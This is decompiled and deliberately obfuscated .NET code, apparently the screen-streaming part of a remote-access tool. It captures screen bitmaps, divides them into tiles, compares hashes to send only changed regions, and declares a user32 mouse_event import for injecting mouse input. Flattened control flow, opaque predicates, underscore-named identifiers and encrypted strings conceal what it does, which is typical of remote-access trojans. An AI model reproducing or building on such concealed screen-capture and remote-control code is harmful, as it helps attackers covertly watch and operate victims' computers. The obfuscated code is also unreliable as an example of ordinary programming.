				length = ((-7141 | -234881024 * num3) == -7141 ? Type.EmptyTypes.Length + 13515 : (int)(sizeof(byte) + -600771725));
				obj = sizeof(long) + -6;
				goto Label3;
			}
		Label5:
			height2 = height2 + bitmaps[num2].Height;
			if (length == 13515)
			{
				goto Label27;
			}
			goto Label28;
		Label6:
			length = -14071;
			if (height3 - 9935 == -(15 * height3 + 17 * height3) >> 5)
			{
				goto Label29;
			}
			if (integer1.ToString().Contains(<Module>.______<string>(1060962588)))
			{
				integer1 = Conversions.ToInteger(Strings.Split(Conversions.ToString(integer1), <Module>._______<string>(1916090129), -1, CompareMethod.Binary)[0]);
				if (204 * height + 820 * height != 7798)
				{
					if (length == -8071)
					{
						goto Label13;
					}
				}
			}
		Label33:
			memoryStream1 = new MemoryStream();
			rectangle = new Rectangle(num6, num, integer, integer1);
			bitmap1 = ______.Clone(rectangle, ______.PixelFormat);
			obj = Type.EmptyTypes.Length + 4;
			goto Label3;
		Label8:
			length = -18724;
			if (bitmaps.Count != 0)
			{
				goto Label30;
			}
			byte[] numArray1 = new byte[1];
			num7 = length;
			length = -25672;
			if (num7 == -18724)
			{
				numArray1[0] = 0;
				array = numArray1;
				return array;
			}
		Label10:
			num6 = (int)Math.Round((double)width / (double)int_1 * (double)num5);
			num7 = length;
			length = -8565;
			if (num7 == -1959)
			{
				if (num8 % 8388608 != -968465429)
				{
					goto Label31;
				}
				goto Label32;
			}
			else
			{
				goto Label32;
			}
		Label9:
			num8++;
			goto Label4;
		Label12:
			memoryStream1.Dispose();
			memoryStream1 = new MemoryStream();
			bitmap2.Save(memoryStream1, ImageFormat.Jpeg);
			num7 = length;
			length = -22886;
			if (num7 == -24264)
			{
				goto Label32;
			}
			goto Label33;
		Label13:
			while (true)
			{
				points = new List<Point>();
				if (_____________________________.________.Count <= 0)
				{
					goto Label34;
				}
				bitmaps.AddRange(_____________________________.________.ToArray());
				num7 = length;
				length = -29861;
				if (num7 == -26341)
				{
					goto Label35;
				}
			}
		Label14:
			length = Type.EmptyTypes.Length + -18724;
			obj = sizeof(Guid) + -11;
			goto Label3;
		Label15:
			if (num5 <= int11)
			{
				num = (int)Math.Round((double)height1 / (double)int_1 * (double)num8);
				length = Type.EmptyTypes.Length + -1959;
				________ = <Module>._______________;
				obj = checked((int)8);
				goto Label3;
			}
			else
			{
				obj = sizeof(Guid) + -9;
				goto Label3;
			}
		Label23:
		Label24:
			while (true)
			{
				encoderParameter = new EncoderParameters(1);
				encoderParameter.Param[0] = new EncoderParameter(System.Drawing.Imaging.Encoder.Quality, (long)int_2);
				if (width1 + 2717 == width1 * -663060480 >> 15)
				{
					break;
				}
				if (length1 != 3968)
				{
					break;
				}
			}
			ImageCodecInfo imageCodecInfo = _____________________________._________________(<Module>._____<string>(810845712));
			bitmap.Save(memoryStream, imageCodecInfo, encoderParameter);
			if ((_______ << 27 & 100663296) == (1610612736 * _______ & 100663296))
			{
				length2 = Type.EmptyTypes.Length + 1;
				goto Label36;
			}
			else
			{
				int ________1 = <Module>.______________;
				if (-1073741824 + ________1 * 32 == ________1 << 5)
				{
					if (2 * ((5164 & length1) - 4776) + -1641590910 != length1 * 3 + length1)
					{
						goto Label26;
					}
					length2 = checked((int)1428674749);
					goto Label36;
				}
				else
				{
					int num12 = ___________._;
					if (~-(num12 * -1503395840) == 262144 * num12)
					{
						goto Label26;
					}
					length2 = Type.EmptyTypes.Length + -1508614911;
					goto Label36;
				}
			}
		Label25:
			_____________________________._________.Add(points[num4]);
		Label45:
			num4++;
			if (436207616 * (________ * 19 + ________ * 13) != -7351)
			{
				goto Label26;
			}
			length2 = Type.EmptyTypes.Length + -812722862;
			goto Label36;
		Label26:
			if (num4 <= count)
			{
				goto Label38;
			}
			graphic.Dispose();
			memoryStream = new MemoryStream();
			length1 = Type.EmptyTypes.Length + -1277;
			length2 = Type.EmptyTypes.Length + 0;
			goto Label36;
		Label29:
		Label32:
			byte[] array1 = memoryStream1.ToArray();
			memoryStream1.Dispose();
			if (Operators.CompareString(_____________________________.________________(numArray), _____________________________.________________(array1), false) == 0)
			{
				goto Label39;
			}
			bitmaps.Add(bitmap1);
			item = new Point(num6, num);
			points.Add(item);
			length = 14420;
			if (Type.EmptyTypes.Length + 19953 == 19953)
			{
				goto Label40;
			}
			goto Label11;
		Label30:
			length = 31758;
			if (-num1 - -1017 == num1 - -7524)
			{
				goto Label41;
			}
			height2 = 0;
			nums = new List<int>();
			num3 = (int)Math.Round((double)(int_1 * int_1) / 5);
			num2 = 0;
			if (length == 31758)
			{
				goto Label42;
			}
			else
			{
				goto Label5;
			}
		Label31:
			integer = (int)Math.Round((double)width / (double)int_1);
			num7 = length;
			length = -7484;
			if (num7 == 31622)
			{
				goto Label2;
			}
			integer1 = (int)Math.Round((double)height1 / (double)int_1);
			if ((31 & height * 17 + 846 + height * 47) == 14)
			{
				if (length != -7484)
				{
					goto Label30;
				}
				if (!integer.ToString().Contains(<Module>.___<string>(-1801479952)))
				{
					goto Label6;
				}
				integer = Conversions.ToInteger(Strings.Split(Conversions.ToString(integer), <Module>.___<string>(-1801479952), -1, CompareMethod.Binary)[0]);
				length = -14071;
				obj = Type.EmptyTypes.Length + 3;
				goto Label3;
			}
			else
			{
				goto Label30;
			}
		Label34:
			______ = (Bitmap)_____________________________._______________(size.Width, size.Height, true);
			length = 6353;
			if (Type.EmptyTypes.Length + 5562 != 5562)
			{
				goto Label31;
			}
			else
			{
				goto Label2;
			}
		Label35:
			_____________________________.________.Clear();
			points.AddRange(_____________________________._________.ToArray());
			_____________________________._________.Clear();
			if (length != -29861)
			{
				goto Label11;
			}
			______ = _____________________________.__________;
			goto Label8;
		Label38:
			if (nums.Contains(num4))
			{
				goto Label45;
			}
			_____________________________.________.Add(bitmaps[num4]);
			goto Label25;
		Label39:
			if (length != 25436)
			{
				goto Label46;
			}
			else
			{
				goto Label9;
			}
		Label40:
			bitmap2.Dispose();
			num5++;
			goto Label15;
		Label41:
		Label46:
			bitmap1.Dispose();
			goto Label40;
		}
	}

	[DllImport("user32", CharSet=CharSet.Ansi, ExactSpelling=true, SetLastError=true)]
	public static extern void mouse_event(int int_0, int int_1, int int_2, int int_3, int int_4);

	private event _____________________________.______________________________ _
	{
		add
		{
			this.___ += value;
		}
		remove
		{
			this.___ -= value;
		}
	}

	private delegate void ______________________________(string string_0);
}